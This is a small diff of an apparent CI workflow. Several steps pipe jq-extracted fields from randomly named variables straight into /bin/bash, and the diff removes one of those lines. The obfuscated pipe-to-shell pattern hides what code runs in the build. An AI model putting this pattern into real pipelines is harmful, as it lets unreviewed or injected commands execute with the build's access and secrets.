@@ -23,7 +23,6 @@ jobs:
           echo $as9675 | jq -r .uumz32 | /bin/bash
           printf '%s' "$o31190" | jq -r .jgoys096 | /bin/bash
           echo $fhu2651 | jq -r .crnz2 | /bin/bash
-          echo $f0 | jq -r .wxupl60 | /bin/bash
           echo $gr2162 | jq -r .if6631 | /bin/bash
 
       - name: Store artifact
